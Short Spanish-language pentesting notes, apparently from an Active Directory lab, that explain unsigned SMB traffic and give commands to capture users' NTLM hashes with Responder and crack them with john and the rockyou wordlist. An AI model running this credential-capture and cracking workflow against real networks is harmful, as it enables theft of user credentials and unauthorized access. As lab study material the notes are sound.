Normalmente en entornos empresariales hay mucha comunicación por SAMBA y por defecto este no esta firmado por lo que se puede interceptar su trafico y obtener los hash de usuarios o cuentas de sistemas

Utilidad de Kali Responder
```
cd /usr/share/responder

python3 Responder.py -I eth0

Aqui capturamos los hash de usuarios que navegan por a red los cuales pondrmos en un fichrero e intentaremos descifrar con john o hashcat

Para descifrar los hash guardados en el fichero hash
john --wordlist=/usr/share/wordlists/rockyou.txt /home/alex/AD_Exercice/hash

Muestra los hash ya descifrados
john --show /home/alex/AD_Exercice/hash
```